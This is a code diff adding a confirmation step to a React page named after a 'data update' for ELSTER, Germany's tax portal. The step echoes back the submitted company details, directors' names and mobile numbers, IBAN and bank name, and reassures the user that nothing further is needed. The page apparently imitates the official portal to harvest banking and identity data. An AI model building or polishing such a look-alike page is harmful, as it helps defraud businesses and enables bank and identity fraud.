@@ -341,6 +341,50 @@ const ElsterDatenaktualisierung = () => {
                   </div>
                 </form>
               )}
+
+              {step === 3 && (
+                <div>
+                  <div style={{ display: "flex", flexDirection: "column", alignItems: "center", textAlign: "center", padding: "12px 0 20px" }}>
+                    <div style={{ width: 64, height: 64, borderRadius: "50%", background: GREEN, color: "#fff", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 16 }}>
+                      <Check size={36} strokeWidth={3} />
+                    </div>
+                    <h2 style={{ fontSize: 22, fontWeight: 400, margin: "0 0 8px", color: TEXT }}>Datenaktualisierung erfolgreich übermittelt</h2>
+                    <p style={{ fontSize: 14, color: MUTED, maxWidth: 480, margin: 0, lineHeight: 1.55 }}>
+                      Ihre Firmen- und Bankdaten wurden erfolgreich übermittelt und werden in unseren Systemen aktualisiert. Es sind keine weiteren Schritte erforderlich.
+                    </p>
+                  </div>
+
+                  <div style={{ border: `1px solid ${BORDER}`, marginTop: 8 }}>
+                    <div style={{ padding: "12px 16px", background: "#f8f8f8", borderBottom: `1px solid ${BORDER}`, fontSize: 14, fontWeight: 600 }}>
+                      Übermittelte Angaben
+                    </div>
+                    <div>
+                      {[
+                        { l: "Unternehmen", v: company },
+                        { l: "E-Mail-Adresse", v: email },
+                        { l: "Telefonnummer", v: phone || "—" },
+                        { l: "Straße, Hausnummer", v: street },
+                        { l: "PLZ, Stadt", v: city },
+                        ...directors.map((d, i) => ({
+                          l: `Geschäftsführer${directors.length > 1 ? ` ${i + 1}` : ""}`,
+                          v: `${d.firstName} ${d.lastName}${d.mobile ? ` · ${d.mobile}` : ""}`,
+                        })),
+                        { l: "IBAN", v: iban },
+                        ...(bankName ? [{ l: "Bank", v: bankName }] : []),
+                      ].map((row, idx, arr) => (
+                        <div key={idx} style={{ display: "flex", justifyContent: "space-between", gap: 16, padding: "10px 16px", borderBottom: idx < arr.length - 1 ? `1px solid ${BORDER}` : "none", fontSize: 14 }}>
+                          <span style={{ color: MUTED }}>{row.l}</span>
+                          <span style={{ color: TEXT, textAlign: "right", wordBreak: "break-word" }}>{row.v}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+
+                  <div style={{ marginTop: 16, background: "#eef7e3", border: `1px solid ${GREEN}`, color: "#2d4a0a", padding: "10px 14px", fontSize: 13, lineHeight: 1.5 }}>
+                    <strong>Hinweis:</strong> Sie erhalten in Kürze eine Bestätigung per E-Mail. Es sind keine weiteren Schritte erforderlich.
+                  </div>
+                </div>
+              )}
             </div>
 
             <aside className="elster-info" style={{ fontSize: 14, lineHeight: 1.5, marginLeft: 16, alignSelf: "start", background: "#f8f8f8", padding: "20px 20px" }}>
